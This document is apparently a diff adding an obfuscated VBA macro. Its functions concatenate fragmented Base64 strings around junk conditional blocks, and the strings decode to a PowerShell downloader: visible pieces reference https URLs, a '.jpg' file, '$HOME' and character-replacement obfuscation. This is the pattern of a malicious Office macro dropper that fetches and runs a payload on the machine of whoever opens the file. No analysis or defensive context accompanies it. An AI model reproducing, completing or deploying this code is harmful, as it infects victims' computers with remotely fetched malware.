+yDte_p = "wA5A" + "DkAMwA" + "3AD" + "YAJw" + "ArACgA" + "JwBBAD" + "gAJ"
+If S_V_Uw Or m_XlMdx Then
+' STRIPPED LINE
+End If
+P0_pw_F = "wArA" + "CcAa" + "ABxACk" + "AKA" + "A2ACc" + "AKwA" + "nAEEA"
+If h5O__J Or Hnb_Lw Then
+' STRIPPED LINE
+End If
+ecncIbj = "MwBjAC" + "cAKQA" + "rAC" + "cAY" + "QBh" + "AGY" + "AJwArA" + "CgAJ" + "wAnA"
+If ZYjDhIg Or vxXp_k Then
+' STRIPPED LINE
+End If
+If V9j_K_ Or ns_NRR Then
+' STRIPPED LINE
+End If
+GgAG_qe = "CsAJwB" + "BADgA" + "aABxA" + "CkAK" + "AA2" + "AEEAMw" + "BjACc" + "AKQAr" + "ACcAJ"
+If y2__Jsl Or xd1wL_ Then
+' STRIPPED LINE
+End If
+If a_s9eJ Or F1r_RM Then
+' STRIPPED LINE
+End If
+If DC__Vu Or PjDVSsy Then
+' STRIPPED LINE
+End If
+vF_YKD = "wAr" + "ACc" + "ANgA5" + "AC4" + "AJwArA" + "CgAJwA"
+If JdVxeg Or jT__jT Then
+' STRIPPED LINE
+End If
+gJ_o1__ = "nACsA" + "JwBB" + "ADgAa" + "ABxACk" + "AKAA" + "2AEE" + "AJw" + "ArACc"
+If Vlg_30 Or o_H_a_ Then
+' STRIPPED LINE
+End If
+Zvkn9_J = "AMwBjA" + "CcAKQ" + "ArACc" + "AagB" + "wAGcA"
+If fkHf_s Or y__j_X_ Then
+' STRIPPED LINE
+End If
+ZXN62O = "JwA" + "rACc" + "AQA" + "BoAHQ" + "AJwAr" + "ACgA" + "JwBBA" + "CcAKw"
+DmyzpR_ = a5V_n_ + Nli_rni + XEPA__r + yDte_p + P0_pw_F + ecncIbj + GgAG_qe + vF_YKD + gJ_o1__ + Zvkn9_J + ZXN62O
+If GLZx9v7 Or WoWdz3 Then
+' STRIPPED LINE
+End If
+If YMNm_h Or VgJ69_t Then
+' STRIPPED LINE
+End If
+End Function
+Function e9_fWvT()
+If vYEDpn Or sY3K__t Then
+' STRIPPED LINE
+End If
+ZCzG_a_ = "AnADg" + "AaABxA" + "CkAKA" + "AnACs" + "AJwA" + "2AE" + "EAJ" + "wArACc"
+If vmy_qh Or vbcZ_68 Then
+' STRIPPED LINE
+End If
+aA__xO = "AMwBjA" + "CcAKQ" + "ArA" + "CcAdA" + "AnACs" + "AJwBwA" + "HMAO" + "gBxAF8"
+If aw_EXvm Or V5___X Then
+' STRIPPED LINE
+End If
+If zOz1JR_ Or L1q_uT_ Then
+' STRIPPED LINE
+End If
+GmH_5bp = "AeAA9A" + "HEA" + "cQBf" + "AHgAP" + "QBxACc" + "AKwA" + "oACc"
+If dq5o__ Or M_or_gs Then
+' STRIPPED LINE
+End If
+If gvg_KB_ Or t_n_iR Then
+' STRIPPED LINE
+End If
+NTL_0a = "AQQ" + "A4AGg" + "AcQApA" + "CgA" + "JwArAC" + "cANgBB" + "ADMA" + "YwAn" + "ACkA"
+If g8zs4C Or v3dVR__ Then
+' STRIPPED LINE
+End If
+If ZeoOv_7 Or KAeReE4 Then
+' STRIPPED LINE
+End If
+If lW___c Or Wgt0_Cp Then
+' STRIPPED LINE
+End If
+SL_I_Gg = "KwAn" + "ACc" + "AKwAnA" + "GgAZ" + "QAn" + "ACsA" + "KAAn" + "AEEAJw"
+If a___buI Or R9VBkNc Then
+' STRIPPED LINE
+End If
+If US6OZt Or Uw__6_ Then
+' STRIPPED LINE
+End If
+P_oTBp = "ArAC" + "cAOAB" + "oAHE" + "AKQ" + "AoACc" + "AKwAn" + "ADYAQQ"
+If Wu9pZJB Or sM5Zs__ Then
+' STRIPPED LINE
+End If
+If q_h__mA Or qhSl_q_ Then
+' STRIPPED LINE
+End If
+If L_vt2G Or vT_b__ Then
+' STRIPPED LINE
+End If
+jWYmCC = "AzAG" + "MAJwAp" + "ACsAJw" + "AnACsA" + "JwB"
+If e_6__A Or b_SlTE Then
+' STRIPPED LINE
+End If
+If bnmb_d Or gq_04c_ Then
+' STRIPPED LINE
+End If
+e_n_M_ = "sAHMA" + "JwA" + "rACcAZ" + "QBjAH" + "QAJw" + "ArAC" + "gAJ" + "wBB" + "ADgAJw"
+If y_Z3TSz Or c1_VjvC Then
+' STRIPPED LINE
+End If
+u_Vk8b = "ArAC" + "cAa" + "ABxACk" + "AKAA2" + "ACc" + "AKwA" + "nAEEA" + "MwBjAC"
+If eGlF___ Or Mc_2__P Then
+' STRIPPED LINE
+End If
+WXPKs__ = "cAKQ" + "ArACc" + "AZgAuA" + "CcAKwA" + "nAG4Ab"
+If Ncv_L0 Or Eq_ok9_ Then
+' STRIPPED LINE
+End If
+If tZ_wi__ Or H_OB7Y_ Then
+' STRIPPED LINE
+End If
+If rq44W_a Or OjUZ_j Then
+' STRIPPED LINE
+End If
+o_hHx__ = "wAnAC" + "sAKA" + "AnA" + "EEAO" + "AAnA" + "CsAJw" + "BoAHEA" + "KQAoAC" + "cAKwA"
+e9_fWvT = ZCzG_a_ + aA__xO + GmH_5bp + NTL_0a + SL_I_Gg + P_oTBp + jWYmCC + e_n_M_ + u_Vk8b + WXPKs__ + o_hHx__
+If PfP7_Io Or o_Qn8h_ Then
+' STRIPPED LINE
+End If
+If VpuT__g Or p_4q_K Then
+' STRIPPED LINE
+End If
+If vYUd__ Or EuCRVgS Then
+' STRIPPED LINE
+End If
+End Function
+Function nHbrCyW()
+If Qr7_kpW Or yxIwGc Then
+' STRIPPED LINE
+End If
+If GlLgwz Or wya__a Then
+' STRIPPED LINE
+End If
+rAgWo9 = "nAD" + "YAQQAz" + "AGMAJ" + "wAp" + "ACsAJw" + "BxA" + "F8Ae" + "AA9A" + "HEAJwA"
+If Wp_fpi_ Or Axe_WY Then
+' STRIPPED LINE
+End If
+If pMCC_d1 Or bxoS_j Then
+' STRIPPED LINE
+End If
+M__qQ4 = "rACc" + "AYgBp" + "ACc" + "AKwAo" + "ACcA" + "QQAnAC"
+If G_XLyC_ Or KS_05c Then
+' STRIPPED LINE
+End If
+If Qf_k_Z Or jhFMVt_ Then
+' STRIPPED LINE
+End If
+b5L_t_D = "sAJw" + "A4AG" + "gAcQA" + "pACg" + "AJwAr" + "ACc"
+If W_7RO_b Or i__gokb Then
+' STRIPPED LINE
+End If
+If Kf15__7 Or oyJiLI Then
+' STRIPPED LINE
+End If
+If E__MqFD Or tg_UQXt Then
+' STRIPPED LINE
+End If
+OQj___ = "ANgB" + "BAC" + "cAKwAn" + "ADMAY" + "wAnACk" + "AKw" + "AnA" + "GwAJ"
+If B9J_I62 Or Ug_940U Then
+' STRIPPED LINE
+End If
+If ysAt_p Or Bio_8Vm Then
+' STRIPPED LINE
+End If
+CN_gcH = "wArACc" + "AZABlA" + "HIAJw" + "ArACg" + "AJw"
+If CZgD9c Or oYEl__n Then
+' STRIPPED LINE
+End If
+nY_b_f = "BBADg" + "AaABx" + "ACkAKA" + "A2AE" + "EAJ" + "wArAC" + "cAMw" + "BjACc" + "AKQAr"
+If Zbt9h_Q Or W_xQ_Sh Then
+' STRIPPED LINE
+End If
+MXuALhG = "ACcAcQ" + "BfAHgA" + "PQBxA" + "DQAJw" + "ArAC" + "cAXwA" + "3AGY" + "AJwAr" + "ACgAJ"
+If mlS_O_ Or F5bm2t_ Then
+' STRIPPED LINE
+End If
+If zhK_yJ Or sB__C__ Then
+' STRIPPED LINE
+End If
+If k_REGb Or cFdlR_8 Then
+' STRIPPED LINE
+End If
+sc_W___ = "wBBADg" + "AaABxA" + "CkA" + "KAA" + "2AC" + "cAKwA" + "nAEEAM" + "wBj" + "ACcAK"
+If sBW8_V1 Or u_6zC_f Then
+' STRIPPED LINE
+End If
+Q2g4_j = "QArA" + "CcAM" + "gA2AC" + "cAKwAn" + "ADEAN" + "AAnA" + "CsA" + "JwBmA" + "GYANQA"
+If Pi_00n Or y_A_92Q Then
+' STRIPPED LINE
+End If
+If VGxgXm Or lR__Mk_ Then
+' STRIPPED LINE
+End If
+O5g_PF_ = "nAC" + "sAKA" + "AnAE" + "EAJwAr" + "ACcAOA" + "BoAH" + "EAK" + "QAoA" + "DYAQQ"
+If G_vR_q_ Or pbJtxr Then
+' STRIPPED LINE
+End If
+If MF_YK__ Or zGm_S_ Then
+' STRIPPED LINE
+End If
+If LHH_dW_ Or XV1mmK Then
+' STRIPPED LINE
+End If
+eKW___ = "AnACsA" + "JwAzAG" + "MAJ" + "wApA" + "CsA"
+If rZg_x_ Or y5_1_wK Then
+' STRIPPED LINE
+End If
+If zKWnL9h Or NG_b3_e Then
+' STRIPPED LINE
+End If
+If u_tA8_0 Or z_5opp Then
+' STRIPPED LINE
+End If
+kqu_W_ = "JwAn" + "ACs" + "AJwBkA" + "GIAJwA" + "rACc" + "AMQAw"
+nHbrCyW = rAgWo9 + M__qQ4 + b5L_t_D + OQj___ + CN_gcH + nY_b_f + MXuALhG + sc_W___ + Q2g4_j + O5g_PF_ + eKW___ + kqu_W_
+If Nvg_pK_ Or z___Tt_ Then
+' STRIPPED LINE
+End If
+If rpZORW Or purpl_ Then
+' STRIPPED LINE
+End If
+If rmlv1_ Or DLhbJgt Then
+' STRIPPED LINE
+End If
+End Function
+Function H0I5i_()
+If xd_OCA_ Or ge6YrL Then
+' STRIPPED LINE
+End If
+If lNPzY_ Or A_2_H_5 Then
+' STRIPPED LINE
+End If
+If eJnF_3n Or yZ_gK_ Then
+' STRIPPED LINE
+End If
+nhH3vc = "ADQAJw" + "ArACgA" + "JwAnAC" + "sAJwB" + "BAD" + "gAJw"
+If x__EVX_ Or FQX__dT Then
+' STRIPPED LINE
+End If
+MlOVR_ = "ArACcA" + "aAB" + "xACk" + "AKA" + "A2AEE" + "AMwBj" + "ACcAKQ" + "ArAC"
+If lV1pU2U Or vS_Rt5 Then
+' STRIPPED LINE
+End If
+cI_d_Y = "cAZ" + "QBlACc" + "AKwAoA" + "CcAQQ" + "AnACs" + "AJwA4" + "AGgAcQ"
+If Lad__Y Or ifPp_9_ Then
+' STRIPPED LINE
+End If
+OATYh_ = "ApAC" + "gAJw" + "ArACcA" + "NgB" + "BAD" + "MAY" + "wAnA" + "CkAKwA"
+If SN5_LP Or T_dR__K Then
+' STRIPPED LINE
+End If
+If QFt8v_d Or r28N_4 Then
+' STRIPPED LINE
+End If
+Gb13_by = "nACcA" + "KwAn" + "ADA" + "AOQBm" + "ADYAZA" + "BmACc" + "AKwA" + "oACc" + "AJwAr"
+If hIF5l7 Or w2C_cd_ Then
+' STRIPPED LINE
+End If
+If YJduKs Or PGfwm_ Then
+' STRIPPED LINE
+End If
+If nTW2tP Or mGPGVKg Then
+' STRIPPED LINE
+End If
+D8kyOXk = "ACcAQQ" + "A4AG" + "gAc" + "QApA" + "CgANgB" + "BADMA" + "YwAnAC" + "kAK" + "wAn"
+If zp_r5zH Or GuFbAB_ Then
+' STRIPPED LINE
+End If
+If JFnE_l Or aKNy0x Then
+' STRIPPED LINE
+End If
+FJu_0_Y = "ADcAO" + "ABi" + "AGIA" + "ZgA" + "nACs" + "AKAAnA"
+If g_YZRSq Or xIs_n_2 Then
+' STRIPPED LINE
+End If
+If kF_rH_ Or m9__S_x Then
+' STRIPPED LINE
+End If
+If PzfNXG Or TxBImb Then
+' STRIPPED LINE
+End If
+f_6Kc_ = "CcAKw" + "AnAE" + "EAOAB" + "oAH" + "EAK" + "QAo" + "ADYAQQ" + "AnAC"
+H0I5i_ = nhH3vc + MlOVR_ + cI_d_Y + OATYh_ + Gb13_by + D8kyOXk + FJu_0_Y + f_6Kc_
+If CyD_55_ Or CgLovM Then
+' STRIPPED LINE
+End If
+If q__iI20 Or BRxF4_x Then
+' STRIPPED LINE
+End If
+End Function
+Function voWFB_x()
+If gN_i_Y_ Or U_YFz_ Then
+' STRIPPED LINE
+End If
+If P_jz_7 Or PV_9z_ Then
+' STRIPPED LINE
+End If
+If aQ_d_q3 Or Mli_YWe Then
+' STRIPPED LINE
+End If
+zc7Wl_B = "sAJwA" + "zAGMAJ" + "wApAC" + "sAJw" + "AzAD"
+If k_4f9_g Or cpI_Z6 Then
+' STRIPPED LINE
+End If
+If p2_YGT Or s__wy7 Then
+' STRIPPED LINE
+End If
+If J3a93dK Or p0v_P_ Then
+' STRIPPED LINE
+End If
+Z5_tBN = "gANA" + "AnACs" + "AKAAnA" + "EEAJ" + "wArAC" + "cAOAB" + "oAHEA" + "KQAoAD" + "YAQQ"
+If xEvOs_r Or AlSxX_ Then
+' STRIPPED LINE
+End If
+If aQ___G2 Or cmRO_F Then
+' STRIPPED LINE
+End If
+If tDX__84 Or ZE8x_t Then
+' STRIPPED LINE
+End If
+SOp9_V = "AnACsA" + "JwAz" + "AGM" + "AJwA" + "pACsAJ" + "wBi" + "ADUA" + "JwA"
+If VxmuMQo Or I0Zt_od Then
+' STRIPPED LINE
+End If
+If cl__t4q Or GA_mNX Then
+' STRIPPED LINE
+End If
+If F__oHq Or swH_1D Then
+' STRIPPED LINE
+End If
+Uu6Nv1R = "rACgA" + "JwAn" + "ACsA" + "JwBBAD" + "gAaABx"
+If wTFlR8d Or VCdOqb_ Then
+' STRIPPED LINE
+End If
+If oaibBL_ Or sm_9__ Then
+' STRIPPED LINE
+End If
+If Htu5H__ Or I86_XV Then
+' STRIPPED LINE
+End If
+jL_1_W = "ACkAKA" + "A2ACc" + "AKw" + "AnAE" + "EAMwB" + "jAC" + "cAKQAr" + "ACcA"
+If L_d65t Or O_0oxr Then
+' STRIPPED LINE
+End If
+If M_mrL_5 Or U9_LNt_ Then
+' STRIPPED LINE
+End If
+If T_o__0Z Or H_VW_e Then
+' STRIPPED LINE
+End If
+tptExFg = "LgBqA" + "CcAK" + "wAn" + "AHAAZw" + "AnACs" + "AJw"
+If NMnu__9 Or B_H____ Then
+' STRIPPED LINE
+End If
+If kkCUted Or H1JgSs_ Then
+' STRIPPED LINE
+End If
+v_HC__9 = "BAAGg" + "AJwArA" + "CgAJ" + "wBBADg" + "AJw" + "ArAC" + "cAaABx"
+voWFB_x = zc7Wl_B + Z5_tBN + SOp9_V + Uu6Nv1R + jL_1_W + tptExFg + v_HC__9
+If i_6w_j_ Or EDMEoiE Then
+' STRIPPED LINE
+End If
+If mf_____ Or jxnQMdx Then
+' STRIPPED LINE
+End If
+If fQ04_7Z Or FY_lsY_ Then
+' STRIPPED LINE
+End If
+End Function
+Function W0___8d()
+If NH9g__b Or R6_4d1_ Then
+' STRIPPED LINE
+End If
+If xwImmL Or v0mqype Then
+' STRIPPED LINE
+End If
+SIe87xV = "ACkAK" + "AA2AC" + "cAK" + "wAnAEE" + "AMwB"
+If WfCTm__ Or W90q__ Then
+' STRIPPED LINE
+End If
+Hwtx_D = "jACc" + "AKQA" + "rACc" + "AdAB0A" + "HAAJw" + "ArACc" + "AcwA6" + "ACcAKw"
+If JC_yBD Or LYII_A_ Then
+' STRIPPED LINE
+End If
+If H_GDK_1 Or ajf7f9_ Then
+' STRIPPED LINE
+End If
+nv4_FL = "AoACc" + "AQQA4A" + "GgAcQA" + "pACgAN" + "gBBA" + "CcA" + "KwAnAD" + "MAY"
+If P_dmT9c Or x_T3R_P Then
+' STRIPPED LINE
+End If
+If IEJMc0 Or ckA__k_ Then
+' STRIPPED LINE
+End If
+If u9P_iW Or qsF6exV Then
+' STRIPPED LINE
+End If
+cNQ_W9M = "wAnA" + "CkAKw" + "AnAH" + "EAXwB4" + "AD0" + "AcQAnA"
+If IK5ONC Or VK_aO_m Then
+' STRIPPED LINE
+End If
+ia__Hj = "CsA" + "JwBxA" + "F8Ae" + "AA9" + "AHEAa" + "ABl" + "AGwA" + "cwAnA"
+If w26_0h_ Or B_B___ Then
+' STRIPPED LINE
+End If
+r0Mymrn = "CsAK" + "AAnAEE" + "AJwArA" + "CcA" + "OABoA" + "HEAK" + "QAoADY" + "AQQAnA"
+If uJ_3rGh Or KLJiKcE Then
+' STRIPPED LINE
+End If
+If SeR_H2 Or LPdV__ Then
+' STRIPPED LINE
+End If
+If Fj__x_ Or T_a_qiK Then
+' STRIPPED LINE
+End If
+L_Fg_J = "CsAJ" + "wAzAG" + "MAJw" + "ApAC" + "sAJ" + "wBlAG" + "MAJ" + "wArA"
+If C_DEdj_ Or JMt_D_ Then
+' STRIPPED LINE
+End If
+baZ3sD = "CgAJw" + "BBACc" + "AKwA" + "nADgAa" + "ABxA" + "CkA" + "KAA2" + "AEEAJw" + "ArACcA"
+If c__siA Or ViMnJ_ Then
+' STRIPPED LINE
+End If
+If g_h__p Or t_lw00 Then
+' STRIPPED LINE
+End If
+aM__xC_ = "MwBj" + "ACcAKQ" + "ArACc" + "AdAB" + "mAC"
+If n_YavrW Or hLJ_b4M Then
+' STRIPPED LINE
+End If
+If t_IvoC Or Qaq_fv Then
+' STRIPPED LINE
+End If
+at_JrF = "cAKw" + "AnAC4" + "AbgBvA" + "HEAXwB" + "4AD0A" + "cQB" + "iACc"
+If T_Rk_A Or d_WjCA8 Then
+' STRIPPED LINE
+End If
+S_K43K = "AKwAo" + "ACcAQQ" + "A4AC" + "cAKwA" + "nAGgA" + "cQA" + "pACg" + "AJwArA" + "CcANg"
+W0___8d = SIe87xV + Hwtx_D + nv4_FL + cNQ_W9M + ia__Hj + r0Mymrn + L_Fg_J + baZ3sD + aM__xC_ + at_JrF + S_K43K
+If kWb_LI8 Or zeI_h6r Then
+' STRIPPED LINE
+End If
+If lqkTCUF Or qZ_Jw_n Then
+' STRIPPED LINE
+End If
+If NASU_8 Or rL6FmUF Then
+' STRIPPED LINE
+End If
+End Function
+Function LRZmTFE()
+If yda64B Or N_4fU3_ Then
+' STRIPPED LINE
+End If
+D_3_7Y_ = "BBAD" + "MAY" + "wAnAC" + "kAKwA" + "nAGkA" + "bAAnAC" + "sAJw" + "BkA"
+If Wook_Zd Or WjJVIr_ Then
+' STRIPPED LINE
+End If
+If Yb_r_5L Or ht_hT8A Then
+' STRIPPED LINE
+End If
+If uM_m5r Or DMBcwt Then
+' STRIPPED LINE
+End If
+T1w_JZV = "GUAcgB" + "xAF" + "8Ae" + "AA9AH" + "EAJwAr" + "ACgA" + "JwB"
+If SrPw8U Or uB_Iccr Then
+' STRIPPED LINE
+End If
+If U_K_g_Y Or xm_wTQz Then
+' STRIPPED LINE
+End If
+ueWz_Z = "BAC" + "cAKwAn" + "ADgAa" + "ABxA" + "CkAK" + "AA2A"
+If Q_6q0l_ Or FSqWHq Then
+' STRIPPED LINE
+End If
+Uo_teUN = "EEAJw" + "ArAC" + "cAM" + "wBj" + "ACcAK" + "QArA" + "CcANQ" + "BfA"
+If OnHJOt Or m5Y_zb Then
+' STRIPPED LINE
+End If
+jnyX_c = "CcA" + "KwAn" + "ADMAO" + "ABkADY" + "ANwA" + "nACsA" + "KAAnA"
+If ix1O8_k Or E2A0lNF Then
+' STRIPPED LINE
+End If
+If f_OS_90 Or bXS_225 Then
+' STRIPPED LINE
+End If
+oM_5M_ = "EEAO" + "ABo" + "AHEAKQ" + "AoADY" + "AQQ" + "AnA" + "CsAJwA" + "zAGMA"
+If bz_nF5_ Or Ty0gY_ Then
+' STRIPPED LINE
+End If
+If mzv6F_ Or G2xuxAe Then
+' STRIPPED LINE
+End If
+If c___Wr Or u_BI_y Then
+' STRIPPED LINE
+End If
+yRNAi_ = "JwA" + "pACsA" + "JwBh" + "ACc" + "AKwAn" + "AGYAMw"
+If NiIA_f Or TbZKVl Then
+' STRIPPED LINE
+End If
+If YK3z_Vh Or Ob_dAv Then
+' STRIPPED LINE
+End If
+If rA4drY Or P_7_nBS Then
+' STRIPPED LINE
+End If
+Uycf4N = "A4AD" + "UAJ" + "wArACc" + "ANwAz" + "ACcAKw" + "AoACcA"
+LRZmTFE = D_3_7Y_ + T1w_JZV + ueWz_Z + Uo_teUN + jnyX_c + oM_5M_ + yRNAi_ + Uycf4N
+If q62_pQg Or c_xH5Vz Then
+' STRIPPED LINE
+End If
+If O_Muc_ Or pNP__aO Then
+' STRIPPED LINE
+End If
+End Function
+Function S_hVc_()
+If hM____d Or Toas_V4 Then
+' STRIPPED LINE
+End If
+FWs4DxB = "JwArA" + "CcA" + "QQA4" + "ACc" + "AKwAnA"
+If x__4uc Or Yy1AXc Then
+' STRIPPED LINE
+End If
+If z__HQ_n Or vz6zxy_ Then
+' STRIPPED LINE
+End If
+If jP24M_o Or uvBmnS Then
+' STRIPPED LINE
+End If
+i0L_9fX = "GgAcQA" + "pAC" + "gAJ" + "wArA" + "CcA" + "NgB"
+If d4_ymo Or C6_jbT Then
+' STRIPPED LINE
+End If
+If o_0rM_D Or dnp9T_ Then
+' STRIPPED LINE
+End If
+If UZ_y8n Or oQnoP4v Then
+' STRIPPED LINE
+End If
+M9bL_yp = "BADMA" + "YwAn" + "ACkAK" + "wAnA" + "DIAZgA"
+If Dd7UxE_ Or oJ8nFUO Then
+' STRIPPED LINE
+End If
+If Y3NO_i Or VDNyh2a Then
+' STRIPPED LINE
+End If
+g_RODU = "1ACc" + "AKwAo" + "ACc" + "AQQA" + "4AGgA" + "cQApA" + "CgA" + "NgAnAC"
+If au___Q Or uM__agR Then
+' STRIPPED LINE
+End If
+If qSX_Okm Or GlQb_Bv Then
+' STRIPPED LINE
+End If
+ngsfe_ = "sAJw" + "BBA" + "DMAYwA" + "nAC" + "kAKwA"
+If keCzefB Or EwwrRx Then
+' STRIPPED LINE
+End If
+If TTmi_o2 Or E2WklDp Then
+' STRIPPED LINE
+End If
+If a4_V_1 Or V_7nWwC Then
+' STRIPPED LINE
+End If
+mjYF3_8 = "nACcA" + "KwAn" + "AGQAN" + "gAzA" + "CcA" + "KwAoAC" + "cAQQA4" + "ACcAK"
+If rR___t Or o3V__F Then
+' STRIPPED LINE
+End If
+If tVn9k_ Or GmoT_n Then
+' STRIPPED LINE
+End If
+If yU_oVOy Or u_1Th__ Then
+' STRIPPED LINE
+End If
+K6bAYFA = "wAnAGg" + "AcQApA" + "CgAJwA" + "rACc" + "ANgBB" + "ADM"
+If xoDKf4n Or t8Gxuyg Then
+' STRIPPED LINE
+End If
+If A0Swruz Or H_O6_cZ Then
+' STRIPPED LINE
+End If
+ax6xq_ = "AYwAn" + "ACkAK" + "wAn" + "ADI" + "AJwA" + "rAC" + "cAO"
+S_hVc_ = FWs4DxB + i0L_9fX + M9bL_yp + g_RODU + ngsfe_ + mjYF3_8 + K6bAYFA + ax6xq_
+If T___b90 Or z5_nNy Then
+' STRIPPED LINE
+End If
+End Function
+Function U57_Em4()
+If Nbi5_xI Or k3kZjId Then
+' STRIPPED LINE
+End If
+Hh2bB6_ = "AA0A" + "CcAK" + "wAn" + "AGQA" + "YgA" + "zAD"
+If wj_gC2 Or l661r_q Then
+' STRIPPED LINE
+End If
+RQaCC_1 = "kAJw" + "ArACg" + "AJwA" + "nAC" + "sAJwBB"
+If n_bJ9__ Or RGDKq_s Then
+' STRIPPED LINE
+End If
+If Niw__MY Or t9de4g Then
+' STRIPPED LINE
+End If
+If R3H_5Z_ Or BtF__x Then
+' STRIPPED LINE
+End If
+h_yb_KR = "ADg" + "AaAB" + "xACkA" + "KAA2A" + "EEAJ" + "wArA" + "CcA" + "MwBjAC" + "cAK"
+If j7uLS_ Or vP2jZzU Then
+' STRIPPED LINE
+End If
+If Ec__JG Or j_0_iy Then
+' STRIPPED LINE
+End If
+If MgIy53h Or EcA0XS Then
+' STRIPPED LINE
+End If
+Nr1xm3t = "QAr" + "ACc" + "AYw" + "A1A" + "DEA" + "JwArA" + "CcAO"
+If tDB_hv8 Or hT_6hv Then
+' STRIPPED LINE
+End If
+If Y_u66U_ Or YmePIns Then
+' STRIPPED LINE
+End If
+zdxa47 = "QA1AG" + "IAYQ" + "AnAC" + "sAKAAn" + "ACcAKw" + "AnA" + "EEA" + "OAB" + "oAHE"
+If h_U_sz Or eIt_6__ Then
+' STRIPPED LINE
+End If
+dA_sYq = "AKQA" + "oADYAQ" + "QAn" + "ACsAJ" + "wAzAG" + "MAJ" + "wApA" + "CsAJw"
+If g8XYHP_ Or ED_8Ma Then
+' STRIPPED LINE
+End If
+K3_Krs = "AuAC" + "cAKw" + "AnAG" + "oAcA" + "BnACc" + "AKQAuA" + "CIAUg" + "BgAE"
+U57_Em4 = Hh2bB6_ + RQaCC_1 + h_yb_KR + Nr1xm3t + zdxa47 + dA_sYq + K3_Krs
+If Cj3YTb Or kkRxRU_ Then
+' STRIPPED LINE
+End If
+If R_S_NP_ Or CMuz___ Then
+' STRIPPED LINE
+End If
+End Function
+Function UUrXVX_()
+If n1x_atc Or yZ_mxM Then
+' STRIPPED LINE
+End If
+If r__ZYLr Or L3tjlB Then
+' STRIPPED LINE
+End If
+If P1P_E3P Or M_8y_C Then
+' STRIPPED LINE
+End If
+Zd__s_ = "UAUAB" + "gAEw" + "AQQBg" + "AGMA" + "ZQA"
+If a_ADe_j Or i__95_ Then
+' STRIPPED LINE
+End If
+If Ye_OoX Or KDQ_Qb_ Then
+' STRIPPED LINE
+End If
+If b8mMq_ Or ajBn1r Then
+' STRIPPED LINE
+End If
+nvvYyXQ = "iACgA" + "JwB" + "BADgAa" + "ABxA" + "CkAKAA" + "2AEEA" + "MwB"
+If t_JTst_ Or z_UCfC4 Then
+' STRIPPED LINE
+End If
+If h_t_uo Or Vijq_s Then
+' STRIPPED LINE
+End If
+H__IgA = "jACcAL" + "AAk" + "AFIAZ" + "QBJAF" + "UAQgBL" + "AE4A"
+If CO9__L Or ch___W Then
+' STRIPPED LINE
+End If
+pO44Jm = "KQAtA" + "HIAZQ" + "BQAGw" + "AYQBDA" + "EUAKA" + "AnAHE" + "AXwB"
+If PN_7x_ Or piJo_Y_ Then
+' STRIPPED LINE
+End If
+If WPV0Mi1 Or r_2_1S_ Then
+' STRIPPED LINE
+End If
+F5J3_fB = "4AD0A" + "cQAnA" + "CwAWw" + "BzAFQ" + "AcgBp" + "AG4" + "AZw" + "BdAF"
+If ziwyAOh Or IAqI16 Then
+' STRIPPED LINE
+End If
+n8__Y_ = "sAQ" + "wBI" + "AGE" + "AUg" + "BdA" + "DQAN"
+If Q1jxU_ Or zhyc__Y Then
+' STRIPPED LINE
+End If
+WJ_15PQ = "wApAC" + "kAOwAk" + "AGQAa" + "ABlAG" + "8ARQBP"
+If oUZ_ZI Or d_lK311 Then
+' STRIPPED LINE
+End If
+cy0mzk_ = "ADE" + "AeQ" + "AgAD0A" + "IAA" + "oACg"
+If o_B56S_ Or s__8_X Then
+' STRIPPED LINE
+End If
+If iyyob3_ Or CEqQrmQ Then
+' STRIPPED LINE
+End If
+d__YV_ = "AJA" + "BIAE" + "8ATQBF" + "ACAAK" + "wAoACI" + "AUQ" + "BJAG0" + "AawBr" + "AEc"
+If Og4___ Or oK_1meI Then
+' STRIPPED LINE
+End If
+m0IS__h = "AZQ" + "BnA" + "FgA" + "VgB" + "YAE"
+If cKe_JD_ Or Q__nuy Then
+' STRIPPED LINE
+End If
+If Wy_F_m Or Q_qcW_W Then
+' STRIPPED LINE
+End If
+If e_0lO_ Or T_uo__4 Then
+' STRIPPED LINE
+End If
+MB3yZ_ = "EASQB" + "sAH" + "EAQwB" + "VAEoAb" + "wBTAF" + "AAc" + "QBDAG"
+If N_O4B3 Or AL_twuJ Then
+' STRIPPED LINE
+End If
+If Hf_kPFY Or yl_rSB Then
+' STRIPPED LINE
+End If
+EYrYiYa = "kASQB" + "sAHEA" + "QwB" + "xAG" + "wATgA" + "4AEwAQ" + "wB1AD" + "gASQBs"
+UUrXVX_ = Zd__s_ + nvvYyXQ + H__IgA + pO44Jm + F5J3_fB + n8__Y_ + WJ_15PQ + cy0mzk_ + d__YV_ + m0IS__h + MB3yZ_ + EYrYiYa
+If YY_gZXb Or ZwY___H Then
+' STRIPPED LINE
+End If
+If emm_90f Or Alo_G_ Then
+' STRIPPED LINE
+End If
+If uduN_y Or amX___b Then
+' STRIPPED LINE
+End If
+End Function
+Function NSp_AV_()
+If hk7R_Y Or JAEhh_ Then
+' STRIPPED LINE
+End If
+zq_jS_W = "AHE" + "AQwA4A" + "FEAagB" + "QAFcA" + "bwAwA"
+If jlf_K_N Or tWC25S Then
+' STRIPPED LINE
+End If
+If dS_G_a4 Or I6_yyf Then
+' STRIPPED LINE
+End If
+XSJ1WA_ = "DYAS" + "QBs" + "AHE" + "AQwAi" + "AFsA"
+If w_R_g_u Or GnB_oo Then
+' STRIPPED LINE
+End If
+If C_U_5_ Or hEp_RV Then
+' STRIPPED LINE
+End If
+ne_w3r_ = "LQAxA" + "C4AL" + "gAtADU" + "AMg" + "BdACA"
+If o_C8T__ Or O_krs5 Then
+' STRIPPED LINE
+End If
+If qC2_teP Or dH1u9q Then
+' STRIPPED LINE
+End If
+N8ep_Ek = "ALQ" + "BqAG8" + "AaQB" + "uACA" + "AJw" + "AnACk" + "AIA" + "ApA" + "C4Ac"
+If EMOi_b Or W_Gs__ Then
+' STRIPPED LINE
+End If
+If Qyl2xvz Or yXSCDiT Then
+' STRIPPED LINE
+End If
+a_X5i6q = "gBlA" + "HAAb" + "ABhA" + "GMAZ" + "QAoACA" + "AIgBD" + "AHEA"
+If r1e_u_ Or Vyb_6W Then
+' STRIPPED LINE
+End If
+If sHsBu4J Or nB8_l_4 Then
+' STRIPPED LINE
+End If
+If xz__Kx Or a_QUIdc Then
+' STRIPPED LINE
+End If
+T4LWSk = "bABJA" + "CIA" + "LABbAH" + "MAd" + "AByAG" + "kAbgBn" + "AF0" + "AWwBj"
+If cvjS__ Or U__89_ Then
+' STRIPPED LINE
+End If
+S39lks = "AGgAYQ" + "ByA" + "F0AOQ" + "AyACkA" + "KQA7A" + "CQASgB" + "lAE"
+If TBEV_Ho Or it_v1A_ Then
+' STRIPPED LINE
+End If
